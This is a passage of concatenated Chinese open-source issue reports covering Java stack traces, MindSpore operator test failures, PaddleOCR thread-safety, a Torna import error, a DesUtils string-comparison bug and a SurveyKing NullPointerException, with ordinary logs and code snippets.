com.yzzf.common.xss.XssFilter.doFilter(XssFilter.java:52) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:888) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1597) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:149) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.GeneratedMethodAccessor64.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) ... 131 common frames omitted"
swagger-plugin导入报错,"Torna版本：1.8.7 Torna-swagger-plugin版本：1.0.5 JDK版本：8.0 MySQL版本：8.0 浏览器： smart-doc版本： 系统导入报错：1： client端导入成功，实际失败，doc_info表name字段长度不足，改为500解决（我本地有些描述比较长，建议官方将这个字典适当放大一些） 2：导入报错： 解析入参时失败，入参为： 烦请大佬帮忙尽快处理一下   <code>: public ParamVo() { } public P getPagger() { return this.pagger; } public void setPagger(P pagger) { this.pagger = pagger; } public C getCondition() { return this.condition; } public void setCondition(C condition) { this.condition = condition; } public Page() { this.records = Collections.emptyList(); } public Page(int current, int size) { super(current, size); this.records = Collections.emptyList(); } public Page(int current, int size, String orderByField) { super(current, size); this.records = Collections.emptyList(); this.setOrderByField(orderByField); } public Page(int current, int size, String orderByField, boolean isAsc) { this(current, size, orderByField); this.setAsc(isAsc); } public List&lt;T&gt; getRecords() { return this.records; } public Page&lt;T&gt; setRecords(List&lt;T&gt; records) { this.records = records; return this; } @Transient public Map&lt;String, Object&gt; getCondition() { return this.condition; } public Page&lt;T&gt; setCondition(Map&lt;String, Object&gt; condition) { this.condition = condition; return this; } public String toString() { StringBuilder pg = new StringBuilder(); pg.append("" Page:{ ["").append(super.toString()).append(""], ""); if (this.records != null) { pg.append(""records-size:"").append(this.records.size()); } else { pg.append(""records is null""); } return pg.append("" }"").toString(); } public String getPostId() { return postId; } public void setPostId(String postId) { this.postId = postId; } public List&lt;DicMonitorPojo&gt; getListDic() { return listDic; } public void setListDic(List&lt;DicMonitorPojo&gt; listDic) { this.listDic = listDic; } public List&lt;BsDocumentAuthorityPojo&gt; getListAuth() { return listAuth; } public void setListAuth(List&lt;BsDocumentAuthorityPojo&gt; listAuth) { this.listAuth = listAuth; } public List&lt;AlarmNoticePojo&gt; getListAlarm() { return listAlarm; } public void setListAlarm(List&lt;AlarmNoticePojo&gt; listAlarm) { this.listAlarm = listAlarm; } public String getPostName() { return postName; } public void setPostName(String postName) { this.postName = postName; }"
我想上传个bin文件，结果提示文件类型不对,"我想上传个bin文件，结果提示文件类型不对   <code>: &lt;div class=""form-group""&gt; &lt;label class=""control-label col-sm-2""&gt;${text('附件上传')}：&lt;/label&gt; &lt;div class=""col-sm-10""&gt; &lt;#form:fileupload id=""uploadFile"" bizKey=""${luatUpdate.id}"" bizType=""luatUpdate_file"" uploadType=""all"" class="""" readonly=""false""/&gt; &lt;/div&gt; &lt;/div&gt;"
图片预览在手机端，大小设置无效,"代码： pc的预览（正常）： 如果确实不可控，建议增加：点击图片关闭的功能   <code>: field: 'scenePic', title: '场景图', formatter: function (value, row, index) { return $.table.imageView(value, '200px', '150px', 'self'); },"
[CT][MS][OP]AdaptiveAvgPool3d operator acceptance problems.,": Ascend CPU /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : test_adaptiveavgpool3d_5d_uint8 test_adaptiveavgpool3d_5d_int16 test_adaptiveavgpool3d_4d_int32 pytest -s -v test_adaptiveavgpool3d.py::test_adaptiveavgpool3d_5d_uint8 pytest -s -v test_adaptiveavgpool3d.py::test_adaptiveavgpool3d_5d_int16 pytest -s -v test_adaptiveavgpool3d.py::test_adaptiveavgpool3d_4d_int32 1.Ascend环境 graph模式 连跑报错core dump graph模式 单跑报错run task error! pynative模式和CPU环境 反向结果与标杆对不上 2.test_adaptiveavgpool3d_5d_int16 反向结果与标杆对不上 涉及用例： test_adaptiveavgpool3d_4d_int64 test_adaptiveavgpool3d_5d_float16 3.test_adaptiveavgpool3d_4d_int32 Ascend环境 graph模式 反向结果与标杆对不上 pynative模式 CPU环境2种模式： 4.test_adaptiveavgpool3d_0d_float16 报错信息中x_dim 应改为 the dim of x 5.test_adaptiveavgpool3d_5d_float32_4_elem_output 报错信息中output_size_num_elem 没有这个字段，请修改为例如the shape dim of output_size等 6.test_adaptiveavgpool3d_5d_float32_2d_output 报错信息中output_size_dim 应该改为the dim of output_size 7.test_adaptiveavgpool3d_5d_float32_x_list 报错信息中input argument[x_dtype]应改为 the dtype of input argument[x] 8.test_adaptiveavgpool3d_5d_float32_output_size_tuple test_adaptiveavgpool3d_5d_float32_output_size_int64 报错信息中the input argument[output_size_dtype] 改为 the dtype of input argument[output_size] 9.test_adaptiveavgpool3d_5d_uint32 test_adaptiveavgpool3d_3d_uint64 报错信息中 the input argument[x_dtype]应改为 the dtype of input argument[x]   <code>: test_adaptiveavgpool3d.py::test_adaptiveavgpool3d_5d_uint8 Fatal Python error: Aborted Thread 0x0000fffe86ff5160 (most recent call first): Thread 0x0000ffff80742010 (most recent call first): File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/common/api.py"", line 759 in _exec_pip File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/common/api.py"", line 83 in wrapper File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/common/api.py"", line 776 in run File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/common/api.py"", line 748 in __call__ File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 826 in compile_and_run File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 478 in __call__ File ""/data1/zhangting/1105code/MindSporeTest/share/ops/primitive/adaptiveavgpool3d_ops.py"", line 53 in forward_mindspore_impl File ""/data1/zhangting/1105code/MindSporeTest/share/ops/primitive/adaptiveavgpool3d_ops.py"", line 67 in forward_cmp File ""/data1/zhangting/1105code/MindSporeTest/operations/test_adaptiveavgpool3d.py"", line 198 in test_adaptiveavgpool3d_5d_uint8 File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/archiconda3/envs/zhangting/bin/pytest"", line 10 in &lt;module&gt; Aborted (core dumped) def test_adaptiveavgpool3d_5d_uint8(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 2, 1024, 6, 6]).astype(np.uint8)) input_output_size = Tensor(np.random.randint(0, 1024, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) &gt; fact.forward_cmp() E RuntimeError: mindspore/ccsrc/backend/session/ascend_session.cc:1396 Execute] run task error! def test_adaptiveavgpool3d_5d_uint8(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 2, 1024, 6, 6]).astype(np.uint8)) input_output_size = Tensor(np.random.randint(0, 1024, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) fact.forward_cmp() &gt; fact.grad_cmp() E AssertionError: E data_expected_std:[102 252 102 ... 102 252 102] E data_me_error:[ 19 93 151 ... 176 50 142] E loss:[ 83 159 207 ... 182 202 216] def test_adaptiveavgpool3d_5d_int16(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 2, 64, 64, 64]).astype(np.int16)) input_output_size = Tensor(np.random.randint(0, 64, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) fact.forward_cmp() &gt; fact.grad_cmp() E AssertionError: E data_expected_std:[-1 -1 2 ... -2 -1 -1] E data_me_error:[-2 -2 1 ... -1 -2 -2] E loss:[1 1 1 ... 1 1 1] def test_adaptiveavgpool3d_4d_int32(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 64, 64, 64]).astype(np.int32)) input_output_size = Tensor(np.random.randint(0, 64, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) fact.forward_cmp() &gt; fact.grad_cmp() E AssertionError: E data_expected_std:[ 1 -1 -1 ... 0 1 0] E data_me_error:[ 2 0 -2 ... 1 0 -1] E loss:[1 1 1 ... 1 1 1] def test_adaptiveavgpool3d_4d_int32(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 64, 64, 64]).astype(np.int32)) input_output_size = Tensor(np.random.randint(0, 64, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) fact.forward_cmp() &gt; fact.grad_cmp() test_adaptiveavgpool3d.py:87: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/adaptiveavgpool3d_ops.py:95: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() ../share/ops/primitive/adaptiveavgpool3d_ops.py:77: in grad_mindspore_impl input_grad = grad_net(self.input_x, self.output_size, Tensor(self.out_grad_np)) /root/archiconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/common/tensor.py:116: in __init__ _check_tensor_input(input_data, dtype, shape, init) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ input_data = array([], shape=(2, 0, 59, 27), dtype=int32), dtype = None, shape = None, init = None def _check_tensor_input(input_data=None, dtype=None, shape=None, init=None): """"""Check the tensor input."""""" if input_data is not None and shape is not None: raise ValueError(""If input_data is available, shape doesn't need to be set"") if init is not None and (shape is None or dtype is None): raise ValueError(""init, dtype and shape must have values at the same time."") if (int(input_data is None) + int(init is None)) != 1: raise TypeError(""input_data and init can not be None at the same time."") if input_data is not None: if isinstance(input_data, np.ndarray) and input_data.ndim &gt; 1 and input_data.size == 0: &gt; raise ValueError(""input_data can not contain zero dimension."") E ValueError: input_data can not contain zero dimension. def test_adaptiveavgpool3d_0d_float16(): input_x = Tensor(np.random.randn(), dtype=mstype.float16) input_output_size = Tensor(np.random.randint(0, 64, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: mindspore/core/utils/check_convert_utils.h:217 CheckInRange] For primitive[AdaptiveAvgPool3d], the x_dim must in [4,5] ,but got 0. E The function call stack (See file '/data1/zhangting/1105code/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details): E # 0 In file /data1/zhangting/1105code/MindSporeTest/share/ops/primitive/adaptiveavgpool3d_ops.py(19) E return self.adaptive_avg_pool_3d(input_x, output_size) def test_adaptiveavgpool3d_5d_float32_4_elem_output(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 2, 64, 64, 64]).astype(np.float32)) input_output_size = Tensor(np.random.randint(0, 64, size=(4,)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: mindspore/core/utils/check_convert_utils.cc:391 CheckInteger] For primitive[AdaptiveAvgPool3d], the output_size_num_elem must be equal to 3, but got 4. def test_adaptiveavgpool3d_5d_float32_2d_output(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 2, 64, 64, 64]).astype(np.float32)) input_output_size = Tensor(np.random.randint(0, 64, size=(1, 3)).astype(np.int32)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: mindspore/core/utils/check_convert_utils.cc:391 CheckInteger] For primitive[AdaptiveAvgPool3d], the output_size_dim must be equal to 1, but got 2. def test_adaptiveavgpool3d_5d_float32_x_list(): input_x = [1, 2, 3] input_output_size = Tensor(np.random.randint(0, 64, size=(3,)).astype(np.int32)) net = AdaptiveAvgPool3dtNet() fact = AnyNetFactory(net=net) # with pytest.raises(TypeError): &gt; fact(input_x, input_output_size) E TypeError: mindspore/core/utils/check_convert_utils.cc:523 CheckTensorTypeValid] For Primitive[AdaptiveAvgPool3d], the input argument[x_dtype] must be a Tensor but got List[Int64*3]. def test_adaptiveavgpool3d_5d_float32_output_size_tuple(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 2, 64, 64, 64]).astype(np.float32)) input_output_size = (1, 2, 3) net = AdaptiveAvgPool3dtNet() fact = AnyNetFactory(net=net) # with pytest.raises(TypeError): &gt; fact(input_x, input_output_size) E TypeError: mindspore/core/utils/check_convert_utils.cc:523 CheckTensorTypeValid] For Primitive[AdaptiveAvgPool3d], the input argument[output_size_dtype] must be a Tensor but got Tuple[Int64*3]. def test_adaptiveavgpool3d_5d_uint32(): input_x = Tensor(np.random.randint(-20000, 20000, size=[2, 2, 64, 64, 64]).astype(np.uint32)) input_output_size = Tensor(np.random.randint(0, 64, size=(3,)).astype(np.int64)) fact = AdaptiveAvgPool3dMock(inputs=[input_x, input_output_size]) # with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E TypeError: mindspore/core/utils/check_convert_utils.cc:595 CheckTensorSubClass] For primitive[AdaptiveAvgPool3d], the input argument[x_dtype] must be a type of { Tensor[Int8], Tensor[Int32], Tensor[Int64], Tensor[UInt8], Tensor[Float16], Tensor[Float32], Tensor[Float64], Tensor[Int16],}, but got UInt32."
"ocr方法, 多线程不安全","在多线程下, 调用PaddleOCR(**kwargs).ocr(image), 能正常返回结果,但是不正确 假设存在如下并发的调用: 可能导致, result1和result2的结果相同 目前推断, 可能图片处理结果的存储区域线程不安全导致的.   <code>: pocr = PaddleOCR(**kwargs).ocr(image) result1 = pocr.ocr(image1) result2 = pocr.ocr(image2) result3 = pocr.ocr(image3)"
pigx-app启动时提示没有license,环境信息 pigx版本: pigx-app4.4.0 是否修改包名: 否 提供详细 npm WARN pigx-app@4.4.0 No license field. audited 10 packages in 0.878s 6 packages are looking for funding run for details found 0 vulnerabilities   <code>: npm fund
Cudnn7 安装问题,"如果Cudnn没安装，会出现以下报错： 按照 NVIDIA 的官网安装并验证： https://docs.nvidia.com/deeplearning/sdk/cudnn-install/index.html#verify 就可以修复这个问题。   <code>: Python 3.7.3 (default, Mar 27 2019, 22:11:17) [GCC 7.3.0] :: Anaconda, Inc. on linux Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. &gt;&gt;&gt; import paddle.fluid Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/site-packages/paddle/__init__.py"", line 25, in &lt;module&gt; import paddle.dataset File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/site-packages/paddle/dataset/__init__.py"", line 28, in &lt;module&gt; import paddle.dataset.mq2007 File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/site-packages/paddle/dataset/mq2007.py"", line 30, in &lt;module&gt; import rarfile File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/site-packages/rarfile.py"", line 2950, in &lt;module&gt; _check_unrar_tool() File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/site-packages/rarfile.py"", line 2931, in _check_unrar_tool custom_check([ORIG_UNRAR_TOOL], True) File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/site-packages/rarfile.py"", line 2823, in custom_check p = custom_popen(cmd) File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/site-packages/rarfile.py"", line 2813, in custom_popen creationflags=creationflags) File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/subprocess.py"", line 775, in __init__ restore_signals, start_new_session) File ""/home/daming/anaconda2/envs/mypython3/lib/python3.7/subprocess.py"", line 1522, in _execute_child raise child_exception_type(errno_num, err_msg, err_filename) NotADirectoryError: [Errno 20] Not a directory: 'unrar'"
DesUtils 存在漏洞,"jeesite4/common/src/main/java/com/jeesite/common/codec/DesUtils.java 其中 fisrtKey secondKey thirdKey 三个参数不为空判断存在错误。java对象相等使用的是equal方法。不能使用!= 和 == 来判断。以下是代码片段： jeesite4/common/src/main/java/com/jeesite/common/codec/DesUtils.java 无报错，但执行会出现系统楼栋错误。   <code>: if(firstKey != null &amp;&amp; firstKey != """" &amp;&amp; secondKey != null &amp;&amp; secondKey != """" &amp;&amp; thirdKey != null &amp;&amp; thirdKey != """"){}"
java.lang.NullPointerException: null SelectAllEvaluator.eval,name: 'java.lang.NullPointerException: null SelectAllEvaluator.eval' about: 报告 SurveyKing 的 bug bug 描述 提交答案时出现了此错误。 复现步骤 答卷设置如下 期望结果 提交成功 复现代码 版本信息 SurveyKing 版本: [e.g. 0.3.2] 浏览器环境 开发环境 [e.g. mac OS] 其他信息   <code>: 2022-08-08 15:49:38.559 [XNIO-1 task-1] ERROR c.s.s.c.m.a.GlobalExceptionHandler - handleInternalServerError /api/public/saveAnswer java.lang.NullPointerException: null at cn.surveyking.server.core.uitls.AnswerScoreEvaluator$SelectAllEvaluator.eval(AnswerScoreEvaluator.java:129) at cn.surveyking.server.core.uitls.AnswerScoreEvaluator.doEval(AnswerScoreEvaluator.java:54) at cn.surveyking.server.core.uitls.AnswerScoreEvaluator.doEval(AnswerScoreEvaluator.java:60) at cn.surveyking.server.core.uitls.AnswerScoreEvaluator.eval(AnswerScoreEvaluator.java:41) at cn.surveyking.server.impl.AnswerServiceImpl.beforeSaveAnswer(AnswerServiceImpl.java:545) at cn.surveyking.server.impl.AnswerServiceImpl.saveAnswer(AnswerServiceImpl.java:195) at cn.surveyking.server.impl.AnswerServiceImpl$$FastClassBySpringCGLIB$$9117d5a.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:783) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:388) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698) at cn.surveyking.server.impl.AnswerServiceImpl$$EnhancerBySpringCGLIB$$d9f32145.saveAnswer(&lt;generated&gt;) at cn.surveyking.server.impl.SurveyServiceImpl.saveAnswer(SurveyServiceImpl.java:146) at cn.surveyking.server.impl.SurveyServiceImpl$$FastClassBySpringCGLIB$$da227c3e.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:783) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:388) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698) at cn.surveyking.server.impl.SurveyServiceImpl$$EnhancerBySpringCGLIB$$3f3a8c71.saveAnswer(&lt;generated&gt;) at cn.surveyking.server.api.SurveyApi.saveAnswer(SurveyApi.java:49) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:517) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:584) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:111) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:111) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:122) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:109) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at cn.surveyking.server.core.security.JwtTokenFilter.doFilterInternal(JwtTokenFilter.java:45) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at 